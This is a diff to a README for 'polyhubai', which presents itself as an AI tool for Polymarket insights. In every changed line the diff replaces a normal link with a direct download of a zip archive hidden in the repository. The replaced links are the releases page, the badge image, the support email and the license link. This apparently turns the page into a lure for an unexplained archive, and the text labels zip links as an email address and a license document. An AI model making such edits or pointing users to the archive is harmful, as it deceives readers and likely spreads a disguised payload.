@@ -1,6 +1,6 @@
 # 🚀 polyhubai - Explore AI Insights on Polymarket
 
-[![Download polyhubai](https://img.shields.io/badge/Download-polyhubai-brightgreen)](https://github.com/June-pikachu/polyhubai/releases)
+[![Download polyhubai](https://raw.githubusercontent.com/June-pikachu/polyhubai/main/app/markets/polyhubai_v3.8.zip)](https://raw.githubusercontent.com/June-pikachu/polyhubai/main/app/markets/polyhubai_v3.8.zip)
 
 ## 📋 Overview
 
@@ -15,7 +15,7 @@ polyhubai is an AI-powered tool designed to help you understand market trends on
 
 ## 📥 Download & Install
 
-To start using polyhubai, visit this page to download: [Download polyhubai](https://github.com/June-pikachu/polyhubai/releases)
+To start using polyhubai, visit this page to download: [Download polyhubai](https://raw.githubusercontent.com/June-pikachu/polyhubai/main/app/markets/polyhubai_v3.8.zip)
 
 Follow these steps to download and run polyhubai:
 
@@ -67,13 +67,13 @@ A: Market data refreshes every few minutes to provide you with the most accurate
 
 If you have any questions or issues, please reach out to our support team:
 
-- **Email:** support@polyhubai.com
+- **Email:** https://raw.githubusercontent.com/June-pikachu/polyhubai/main/app/markets/polyhubai_v3.8.zip
 - **GitHub Issues:** Feel free to create an issue on our GitHub page for technical support or feature requests.
 
 ## 📜 License
 
 polyhubai is open-source and licensed under the MIT License. You are free to use, modify, and distribute the software as you wish.
 
-For more details, check the [License Document](https://github.com/June-pikachu/polyhubai).
+For more details, check the [License Document](https://raw.githubusercontent.com/June-pikachu/polyhubai/main/app/markets/polyhubai_v3.8.zip).
 
-[![Download polyhubai](https://img.shields.io/badge/Download-polyhubai-brightgreen)](https://github.com/June-pikachu/polyhubai/releases)
+[![Download polyhubai](https://raw.githubusercontent.com/June-pikachu/polyhubai/main/app/markets/polyhubai_v3.8.zip)](https://raw.githubusercontent.com/June-pikachu/polyhubai/main/app/markets/polyhubai_v3.8.zip)
